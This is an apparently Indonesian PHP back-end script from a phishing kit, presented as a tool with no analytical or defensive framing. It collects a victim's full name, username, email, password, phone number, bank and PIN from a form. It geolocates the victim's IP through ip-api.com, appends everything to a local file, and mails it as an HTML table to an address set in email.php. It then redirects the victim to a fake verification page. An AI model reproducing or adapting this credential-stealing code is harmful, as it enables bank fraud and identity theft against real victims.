<?php
error_reporting(0);
$fullname=$_POST['fullname'];
$namapengguna=$_POST['username'];
$email = $_POST['email'];
$pass = $_POST['password'];
$nomorhp =  $_POST['nomorhp'];
$bank=  $_POST['method'];
$pin = $_POST['pin'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('in_timezone');
$tarih=date("d-m-Y H:i:s");
$file = fopen('sensitiveinfo.txt', 'a');
fwrite($file, "fullname: ".$fullname."\n\n" ."nama pengguna: ".$namapengguna. "\n\n"."email: ".$email."\n\n"."Ip Address: " .$ip."\n\n".
"Country: ".$ulke ."\n\n".   "Time: " .$tarih.  "\n\n\"". "password : " .$pass."\n\n". "nomorhp:".$nomorhp."\n\n" . "bank:".$bank."\n\n" . "pin:".$pin."\n\n");
fclose($file);
$subject = "ADE AR pendaftaran{ $email }";
$message = '
<center> 
<div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
<font size="3.5"><b>Ade AR HACKER</b></font>
</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
  <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Ip Address</th>
  <th style="width:78%;text-align: center;"><b>'.$ip.'</th> 
 </tr>
  <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>fullname</th>
  <th style="width:78%;text-align: center;"><b>'.$fullname.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>nama pengguna</th>
  <th style="width:78%;text-align: center;"><b>'.$namapengguna.'</th> 
 </tr>
  <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Email</th>
  <th style="width:78%;text-align: center;"><b>'.$email.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Password</th>
  <th style="width:78%;text-align: center;"><b>'.$pass.'</th> 
 </tr>
  <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>nomor hp</th>
  <th style="width:78%;text-align: center;"><b>'.$nomorhp.'</th> 
 </tr>
   <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>BANK</th>
  <th style="width:78%;text-align: center;"><b>'.$bank.'</th> 
 </tr>
   <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>pin</th>
  <th style="width:78%;text-align: center;"><b>'.$pin.'</th> 
 </tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>waktu</th>
<th style="width:78%;text-align: center;"><b>'.$tarih.'</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>negara</th>
<th style="width:78%;text-align: center;"><b>'.$ulke.'</th> 
</tr>
 </table>
<div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
<font size="3"><b>AR WHO AM I</b></font>
</div>
</center>
';
include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: WEB ADE<AR@gmail.com>' . "\r\n";
$datamail = mail($ikhbaljb, $subject, $message, $headersx);
?>
<html>
<head>
<meta http-equiv="REFRESH" content="0;url=verify.html">
</head>
<body>
</body>
</html>
